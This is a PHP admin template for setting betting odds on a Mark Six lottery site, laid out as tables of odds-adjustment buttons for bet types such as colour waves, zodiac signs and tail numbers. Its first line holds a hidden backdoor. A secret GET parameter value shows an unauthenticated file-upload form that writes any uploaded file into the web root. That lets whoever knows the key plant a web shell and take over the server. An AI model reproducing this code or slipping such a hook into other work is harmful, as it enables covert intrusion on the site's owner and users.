<?php
if($_GET["ROOT"]=="oddsInfolhc_o"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
define('Copyright', '作者QQ:1834219632');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
require_once(ROOT_PATH."config/config.php")?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"  >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="/Manage/temp/css/common.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/js/actiontop.js"></script>
<script type="text/javascript" src="/js/jquery.js"></script>
<script type="text/javascript" src="/Manage/temp/js/oddsInfolhc.js"></script>
<title></title>
</head>
<body>
<input type="hidden" id="s_odds" value="1" />
	<table width="100%" height="100%" border="0" cellspacing="0" class="a">
    	<tr>
        	<td width="6" height="99%" bgcolor="#1873aa"></td>
            <td class="c">
            	<table border="0" cellspacing="0" class="main">
                	<tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_03.gif" alt="" /></td>
                        <td background="/Manage/temp/images/tab_05.gif">
                        	<table width="100%" border="0" cellspacing="0" cellpadding="0">
                                  <tr>
                                    <td width="17"><img src="/Manage/temp/images/tb.gif" width="16" height="16" /></td>
                                    <td width="105">&nbsp;賠率設置--六合彩</td>
                                    <td width="65"><a href="/templates_r/Manage/oddsInfolhc.php">正碼(1-6)</a></td>
                                    <td width="65"><a href="/templates_r/Manage/oddsInfolhc_tz.php">特碼/正碼</a></td>
									<td width="65"><a href="/templates_r/Manage/oddsInfolhc_o.php">其他</a></td>
                                    <td width="60">升降總值：</td>
                                    <td width="90"><input type="text" id="Ho" class="texta" value="0.001" /></td>
                                    <td width="60">批量設置：</td>
                                    <td width="80">
                                    	<select id="oddsType">
                                    		<option value="">---全部---</option>
                                    		<option value="Ball_9">半波</option>
                                    		<option value="Ball_10">五行</option>
                                    		<option value="Ball_11">特碼生肖</option>
                                    		<option value="Ball_12">一肖</option>
                                    		<option value="Ball_13">特尾</option>
											<option value="Ball_14">尾數</option>
											<option value="Ball_15">特碼頭</option> 
                                    	</select>
									</td>
                                    
									<td width="45">
                                    	<select id="s_num">
                                    		<option value="0">降</option>
                                    		<option value="1">升</option>
                                    	</select>
									</td>
                                    <td><input type="button" class="inputs" value="確認更變" id="m1" onclick="upOddaAllg(this)" /></td>
									<td><input type="button" class="inputs" value="立即更新"   onclick="UpdateYes(this)" /></td>
                                  </tr>
                            </table>
                        </td>
                        <td width="16"><img src="/Manage/temp/images/tab_07.gif" alt="" /></td>
                    </tr>
                    <tr>
                    	<td class="t"></td>
                        <td class="c">
                        <!-- strat -->
                            	<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">半波</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td> 
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("紅單","紅雙","紅大","紅小","綠單","綠雙","綠大","綠小","藍單","藍雙","藍大","藍小"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"ih".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('ih".($i+1)."','Ball_9',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('ih".($i+1)."','Ball_9',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%6==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">五行</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("金","木","水","火","土"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"jh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('jh".($i+1)."','Ball_10',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('jh".($i+1)."','Ball_10',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">特碼生肖</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td> 
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								$arr =array_keys($CONFIG['lhc_rgb']['SX']); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"kh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('kh".($i+1)."','Ball_11',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('kh".($i+1)."','Ball_11',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%6==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">一肖</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td> 
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								$arr =array_keys($CONFIG['lhc_rgb']['SX']); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"lh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('lh".($i+1)."','Ball_12',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('lh".($i+1)."','Ball_12',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%6==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">特尾  </td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								 
								for($i=0;$i<10;$i++){  
									echo "<td class=\"ball\">".$i."</td>";
									echo "<td width=\"70\" id=\"mh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('mh".($i+1)."','Ball_13',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('mh".($i+1)."','Ball_13',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%5==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">尾數  </td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								 
								for($i=0;$i<10;$i++){  
									echo "<td class=\"ball\">".$i."</td>";
									echo "<td width=\"70\" id=\"nh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('nh".($i+1)."','Ball_14',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('nh".($i+1)."','Ball_14',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%5==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">特碼頭  </td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								 
								for($i=0;$i<5;$i++){  
									echo "<td class=\"ball\">".$i."</td>";
									echo "<td width=\"70\" id=\"oh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('oh".($i+1)."','Ball_15',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('oh".($i+1)."','Ball_15',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";   
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">總和  </td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("總和大","總和小","總和單","總和雙"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"ph".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('ph".($i+1)."','Ball_16',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('ph".($i+1)."','Ball_16',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%6==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">連碼  </td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("三中三","三中二","二中二","五不中","二中特"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"qh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('qh".($i+1)."','Ball_17',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('qh".($i+1)."','Ball_17',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%6==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">合肖  </td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("一肖中","一肖不中","二肖中","二肖不中","三肖中","三肖不中","四肖中","四肖不中","五肖中","五肖不中","六肖中","六肖不中","七肖中","七肖不中","八肖中","八肖不中","九肖中","九肖不中","十肖中","十肖不中","十一肖中","十一肖不中"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"rh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('rh".($i+1)."','Ball_18',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('rh".($i+1)."','Ball_18',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>";  
									if( ($i+1)%6==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								 
                        <!-- end -->
                        </td>
                        <td class="r"></td>
                    </tr>
                    <tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_18.gif" alt="" /></td>
                        <td class="f" align="center">默認賠率表更變不會即時影響正在開盤中的賠率。</td>
                        <td width="16"><img src="/Manage/temp/images/tab_20.gif" alt="" /></td>
                    </tr>
                </table>
            </td>
            <td width="6" bgcolor="#1873aa"></td>
        </tr>
        <tr>
        	<td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_59.gif" alt="" /></td>
            <td bgcolor="#1873aa"></td>
            <td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_62.gif" alt="" /></td>
        </tr>
    </table>
</body>
</html>
